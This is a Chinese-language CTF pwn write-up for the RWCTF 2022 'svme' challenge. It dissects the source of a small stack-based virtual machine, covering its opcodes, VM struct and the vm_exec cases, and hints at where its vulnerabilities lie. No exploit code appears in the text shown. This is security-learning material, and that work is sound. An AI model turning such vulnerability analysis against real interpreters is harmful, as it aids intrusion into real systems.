@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="第一次做VM相关题目，之前也有看到过，但是逆向虚拟机实在太复杂，而且别人的wp根本不会去讲怎么逆向的。这次2022RWctf一上来就是vm题，但是给了源码，而且是比较简短的虚拟机，正好可以借此学习一下逆向vm与一般vm的写法和漏洞点。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RWctf-2022-svme">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/01/27/RWctf-2022-svme/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="第一次做VM相关题目，之前也有看到过，但是逆向虚拟机实在太复杂，而且别人的wp根本不会去讲怎么逆向的。这次2022RWctf一上来就是vm题，但是给了源码，而且是比较简短的虚拟机，正好可以借此学习一下逆向vm与一般vm的写法和漏洞点。">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220127124332799.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220127121027358.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220127112521974.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220127222913557.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220127223151235.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128095331460.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128095752952.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128095738557.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128095928257.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128100347355.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128100631983.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128100845424.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128104118667.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128104118667.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128104445484.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128104545214.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128104600579.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128104808492.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220128105202395.png">
+<meta property="article:published_time" content="2022-01-27T01:29:34.000Z">
+<meta property="article:modified_time" content="2023-07-12T11:09:26.136Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="VM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220127124332799.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>RWctf-2022-svme | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-RWctf-2022-svme" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/01/27/RWctf-2022-svme/" class="article-date">
+      <time datetime="2022-01-27T01:29:34.000Z" itemprop="datePublished">2022-01-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      RWctf-2022-svme
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VM/" rel="tag">VM</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>第一次做VM相关题目，之前也有看到过，但是逆向虚拟机实在太复杂，而且别人的wp根本不会去讲怎么逆向的。这次2022RWctf一上来就是vm题，但是给了源码，而且是比较简短的虚拟机，正好可以借此学习一下逆向vm与一般vm的写法和漏洞点。</p>
+<span id="more"></span>
+
+<h1 id="svme"><a href="#svme" class="headerlink" title="svme"></a>svme</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><h3 id="指令集与结构体"><a href="#指令集与结构体" class="headerlink" title="指令集与结构体"></a>指令集与结构体</h3><p>在此vm中，有以下的指令集</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    NOOP    = <span class="number">0</span>,</span><br><span class="line">    IADD    = <span class="number">1</span>,   <span class="comment">// int add</span></span><br><span class="line">    ISUB    = <span class="number">2</span>,   <span class="comment">// int sub</span></span><br><span class="line">    IMUL    = <span class="number">3</span>,   <span class="comment">// int multiply</span></span><br><span class="line">    ILT     = <span class="number">4</span>,   <span class="comment">// int less than</span></span><br><span class="line">    IEQ     = <span class="number">5</span>,   <span class="comment">// int equal</span></span><br><span class="line">    BR      = <span class="number">6</span>,   <span class="comment">// branch</span></span><br><span class="line">    BRT     = <span class="number">7</span>,   <span class="comment">// branch if true</span></span><br><span class="line">    BRF     = <span class="number">8</span>,   <span class="comment">// branch if true</span></span><br><span class="line">    ICONST  = <span class="number">9</span>,   <span class="comment">// push constant integer</span></span><br><span class="line">    LOAD    = <span class="number">10</span>,  <span class="comment">// load from local context</span></span><br><span class="line">    GLOAD   = <span class="number">11</span>,  <span class="comment">// load from global memory</span></span><br><span class="line">    STORE   = <span class="number">12</span>,  <span class="comment">// store in local context</span></span><br><span class="line">    GSTORE  = <span class="number">13</span>,  <span class="comment">// store in global memory</span></span><br><span class="line">    PRINT   = <span class="number">14</span>,  <span class="comment">// print stack top</span></span><br><span class="line">    POP     = <span class="number">15</span>,  <span class="comment">// throw away top of stack</span></span><br><span class="line">    CALL    = <span class="number">16</span>,  <span class="comment">// call function at address with nargs,nlocals</span></span><br><span class="line">    RET     = <span class="number">17</span>,  <span class="comment">// return value from function</span></span><br><span class="line">    HALT    = <span class="number">18</span></span><br><span class="line">&#125; VM_CODE;</span><br></pre></td></tr></table></figure>
+
+<p>如果了解ARM架构会对此指令集比较熟悉，这个指令集和ARM很类似。</p>
+<p>与之相关的，有以下的虚拟机操作函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VM *<span class="title function_">vm_create</span><span class="params">(<span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_free</span><span class="params">(VM *vm)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_init</span><span class="params">(VM *vm, <span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_exec</span><span class="params">(VM *vm, <span class="type">int</span> startip, <span class="type">bool</span> trace)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_print_instr</span><span class="params">(<span class="type">int</span> *code, <span class="type">int</span> ip)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_print_stack</span><span class="params">(<span class="type">int</span> *<span class="built_in">stack</span>, <span class="type">int</span> count)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vm_print_data</span><span class="params">(<span class="type">int</span> *globals, <span class="type">int</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个vm能做的比较少，只有新建，执行，free以及一些调试函数。</p>
+<p>分析一下第一个函数的返回值，VM结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> *code;</span><br><span class="line">    <span class="type">int</span> code_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// global variable space</span></span><br><span class="line">    <span class="type">int</span> *globals;</span><br><span class="line">    <span class="type">int</span> nglobals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Operand stack, grows upwards</span></span><br><span class="line">    <span class="type">int</span> <span class="built_in">stack</span>[DEFAULT_STACK_SIZE];</span><br><span class="line">    Context call_stack[DEFAULT_CALL_STACK_SIZE];</span><br><span class="line">&#125; VM;</span><br></pre></td></tr></table></figure>
+
+<p>其中包含了代码指针（为什么用int？这是因为这个虚拟机是一个定长指令架构，每条指令长度都为4B，在.h文件中写明了）。观察以下交互代码，会更容易理解。下图中红色的是指令，蓝色的是指令的操作数。</p>
+<p><img src="/.io//image-20220127124332799.png" alt="image-20220127124332799"></p>
+<p>结构体还有全局变量起始地址和数量、向上生长的栈空间。接下来可以分析执行函数了。</p>
+<h3 id="vm-create"><a href="#vm-create" class="headerlink" title="vm_create"></a>vm_create</h3><p>vm_create和vm_init起到创建vm和分配空间的作用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VM *<span class="title function_">vm_create</span><span class="params">(<span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span></span><br><span class="line">&#123;</span><br><span class="line">    VM *vm = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(VM));</span><br><span class="line">    vm_init(vm, code, code_size, nglobals);</span><br><span class="line">    <span class="keyword">return</span> vm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vm_init</span><span class="params">(VM *vm, <span class="type">int</span> *code, <span class="type">int</span> code_size, <span class="type">int</span> nglobals)</span></span><br><span class="line">&#123;</span><br><span class="line">    vm-&gt;code = code;</span><br><span class="line">    vm-&gt;code_size = code_size;</span><br><span class="line">    vm-&gt;globals = <span class="built_in">calloc</span>(nglobals, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    vm-&gt;nglobals = nglobals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="vm-exec"><a href="#vm-exec" class="headerlink" title="vm_exec"></a>vm_exec</h3><p>vm_exec是虚拟机执行函数。虚拟机整体是利用switch case执行的内部定义代码。这个函数比较长。</p>
+<p>首先是寄存器定义。此虚拟机只模拟了三个寄存器，指令、栈指针和调用栈指针。可想而知，此虚拟机是利用栈传递函数调用的参数的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vm_exec</span><span class="params">(VM *vm, <span class="type">int</span> startip, <span class="type">bool</span> trace)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// registers</span></span><br><span class="line">    <span class="type">int</span> ip;         <span class="comment">// instruction pointer register</span></span><br><span class="line">    <span class="type">int</span> sp;         <span class="comment">// stack pointer register</span></span><br><span class="line">    <span class="type">int</span> callsp;     <span class="comment">// call stack pointer register</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来是初始化值的设置。对于上面三个寄存器其中ip设置为main.c中的启动位置，为0，另外两个设置为-1，表示未初始化。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ip = startip;</span><br><span class="line">sp = <span class="number">-1</span>;</span><br><span class="line">callsp = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> opcode = vm-&gt;code[ip];</span><br></pre></td></tr></table></figure>
+
+<p>接下来是循环体。用于处理自定义汇编代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (opcode != HALT &amp;&amp; ip &lt; vm-&gt;code_size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (trace) vm_print_instr(vm-&gt;code, ip);</span><br><span class="line">    ip++; <span class="comment">//jump to next instruction or to operand</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> IADD:</span><br><span class="line">            b = vm-&gt;<span class="built_in">stack</span>[sp--];           <span class="comment">// 2nd opnd at top of stack</span></span><br><span class="line">            a = vm-&gt;<span class="built_in">stack</span>[sp--];           <span class="comment">// 1st opnd 1 below top</span></span><br><span class="line">            vm-&gt;<span class="built_in">stack</span>[++sp] = a + b;       <span class="comment">// push result</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里trace其实是给了我们一个调试函数，可以打印吃vm当前执行的指令和栈。对于我们理解vm如何运作至关重要。</p>
+<p>在这里，我们看到了第一个指令IADD。根据注释，可以看出它其实是整数相加。怎么运作呢？首先取出a，b两个操作数（存在栈上）并同时减少sp栈指针寄存器（栈向上生长）接着把栈顶存上a+b的值也就是iadd的结果。</p>
+<p>接着的isub和imul也是一模一样的。需要注意的是isub是先入栈的作为被减数。例如isub 5 2计算的是5-2=3，后面3被放回栈顶。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ISUB:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = a - b;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IMUL:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = a * b;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>后面两个操作数是比较大小。基本语法和上面十分类似，大家可以自己学着分析。主语ilt是将第一个操作数和第二个做对比。例如ilt 2 3返回的是true（放在栈顶），因为2小于3。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ILT:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = (a &lt; b) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IEQ:</span><br><span class="line">    b = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    a = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = (a == b) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
+
+<p>接下来是三个跳转指令。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BR: <span class="comment">// 直接跳转</span></span><br><span class="line">    ip = vm-&gt;code[ip];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BRT: <span class="comment">// 正确时跳转</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;<span class="built_in">stack</span>[sp--] == <span class="literal">true</span>) ip = addr;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BRF: <span class="comment">// 错误时跳转</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;<span class="built_in">stack</span>[sp--] == <span class="literal">false</span>) ip = addr;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>跳转指令作为控制指令的核心内容，需要认真分析构成形式。</p>
+<p><strong>直接跳转</strong>：如果碰到BR指令，可以看到它不需要操作数，直接取出代码段的下一条指令开始执行。相当于x86中的jmp。</p>
+<p><strong>条件跳转</strong>：条件跳转判断的依据是在栈顶的操作数。注意这里很有意思的一点是true和false全部宏定义为1和0.这意味着我们完全可以通过写入值来作为跳转条件执行汇编代码。这里请注意，为什么这里的<code>addr = vm-&gt;code[ip++];</code>而不是像br一样的直接是ip呢？因为跳转有错误的可能，如果错误我们就直接按照原先的指令执行下去即可。一般原先的指令将会是一个jmp，这样就不会执行到<code>code[ip++]</code>的位置了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ICONST:</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;code[ip++];  <span class="comment">// push operand</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> LOAD: <span class="comment">// load local or arg</span></span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;call_stack[callsp].locals[offset];</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>接下来是全局变量设置指令。iconst指令起到初始化变量，将他们放置在栈上的作用。load指令先获取要load第几个操作数，之后将他储存在当前栈上。这里<code>callsp</code>变量记录了当前函数所在栈。locals表示储存的变量。在后面会被设置。</p>
